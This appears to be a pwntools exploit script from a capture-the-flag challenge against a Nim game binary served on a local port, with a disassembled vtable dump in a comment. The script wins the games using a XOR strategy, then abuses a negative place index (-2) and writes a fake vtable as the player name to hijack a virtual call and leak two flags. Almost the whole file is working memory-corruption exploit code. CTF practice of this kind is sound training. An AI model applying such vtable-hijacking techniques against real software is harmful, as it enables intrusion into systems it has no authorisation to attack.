from pwn import *

# context.terminal = ["tmux","splitw","-h"]
context.log_level = 'info'
context.arch = 'amd64'

# io = gdb.debug("./nimgame", "b NimBoard::reset")
# io = process("./nimgame")
io = remote("localhost", 10051)
flag1 = ""
flag2 = ""

"""
.data.rel.ro:0000000000408BB8 ; `vtable for'NimBoard
.data.rel.ro:0000000000408BB8 _ZTV8NimBoard   dq 0                    ; offset to this
.data.rel.ro:0000000000408BC0                 dq offset _ZTI8NimBoard ; `typeinfo for'NimBoard
.data.rel.ro:0000000000408BC8 off_408BC8      dq offset _ZN8NimBoard5resetEv
.data.rel.ro:0000000000408BC8                                         ; DATA XREF: NimBoard::NimBoard(void)+1C↑o
.data.rel.ro:0000000000408BC8                                         ; NimBoard::reset(void)
.data.rel.ro:0000000000408BD0                 dq offset _ZN8NimBoard4moveEP6Action ; NimBoard::move(Action *)
.data.rel.ro:0000000000408BD8                 dq offset _ZN8NimBoard6unmoveEP6Action ; NimBoard::unmove(Action *)
.data.rel.ro:0000000000408BE0                 dq offset _ZN8NimBoard17get_legal_actionsB5cxx11Ev ; NimBoard::get_legal_actions(void)
.data.rel.ro:0000000000408BE8                 dq offset _ZN8NimBoard18check_action_legalEP6Action ; NimBoard::check_action_legal(Action *)
.data.rel.ro:0000000000408BF0                 dq offset _ZN8NimBoard10get_winnerEv ; NimBoard::get_winner(void)
.data.rel.ro:0000000000408BF8                 dq offset _ZN8NimBoard10show_boardEv ; NimBoard::show_board(void)
.data.rel.ro:0000000000408C00                 dq offset _ZN8NimBoard11envaluationEi ; NimBoard::envaluation(int)

0x408bb8 <_ZTV8NimBoard>:       0x0000000000000000      0x0000000000408d90
0x408bc8 <_ZTV8NimBoard+16>:    0x000000000040189c      0x0000000000401988
0x408bd8 <_ZTV8NimBoard+32>:    0x00000000004019f6      0x0000000000401a62
0x408be8 <_ZTV8NimBoard+48>:    0x0000000000401b3c      0x0000000000401b9a
0x408bf8 <_ZTV8NimBoard+64>:    0x0000000000401bea      0x0000000000401cfc

"""


def action(a, b, c):
    for i in range(1, a+1):
        if not ((a-i) ^ b ^ c):
            return b'A', i
    for i in range(1, b+1):
        if not (a ^ (b-i) ^ c):
            return b'B', i
    for i in range(1, c+1):
        if not (a ^ b ^ (c-i)):
            return b'C', i
    # no winning strategy
    warn("WARNING: WE MIGHT LOSE THE GAME")
    if a:
        return b'A', 1
    if b:
        return b'B', 1
    if c:
        return b'C', 1

def get_3_heap():
    io.recvuntil(b"heap A:")
    io.recvuntil(b" | ")
    a = int(io.recvuntil(b" "))
    io.recvuntil(b"heap B:")
    io.recvuntil(b" | ")
    b = int(io.recvuntil(b" "))
    io.recvuntil(b"heap C:")
    io.recvuntil(b" | ")
    c = int(io.recvuntil(b" "))
    return a, b, c

io.sendafter(b"Do you want to play with me? y/n ", b"y")
io.sendafter(b"Your name, plz\n", b"hitctf")
io.sendafter(b"1: you go first; 2: AI goes first", b"1")

a, b, c = get_3_heap()
heap, takenum = action(a, b, c)
io.sendafter(b"which heap? >", heap)
io.sendafter(b"how much to take? >", str(takenum).encode())
while True:
    io.recvuntil(b"Computer's turn!")
    a, b, c = get_3_heap()
    # print(a, b, c)
    heap, takenum = action(a, b, c)
    # print(heap, takenum)
    io.sendafter(b"which heap? >", heap)
    io.sendafter(b"how much to take? >", str(takenum).encode())
    if a+b+c == takenum:
        break

io.sendafter(b"Choose a place for yourself!", b"-2")

# use getwinner to replace evaluation
fake_vtable = flat(0x000000000040189c,
                   0x0000000000401988,
                   0x00000000004019f6,
                   0x0000000000401a62,
                   0x0000000000401b3c,
                   0x0000000000401b9a,
                   0x0000000000401bea,
                   0x0000000000401b9a)

io.sendafter(b"What's your name? > ", fake_vtable)

io.recvuntil(b"here is your gift: ")
flag1 = io.recvline().strip()

io.sendafter(b"Do you want another game? y/n", b"y")
io.sendafter(b"1: you go first; 2: AI goes first", b"2")

while True:
    io.recvuntil(b"Computer's turn!")
    a, b, c = get_3_heap()
    # print(a, b, c)
    heap, takenum = action(a, b, c)
    # print(heap, takenum)
    io.sendafter(b"which heap? >", heap)
    io.sendafter(b"how much to take? >", str(takenum).encode())
    if a+b+c == takenum:
        break


io.sendafter(b"Choose a place for yourself!", b"0")
io.sendafter(b"What's your name? > ", b"yty")
io.recvuntil(b"here is your gift: ")
flag2 = io.recvline().strip()
io.sendafter(b"Do you want another game? y/n", b"n")

info("flag1: " + flag1.decode())
info("flag2: " + flag2.decode())

io.close()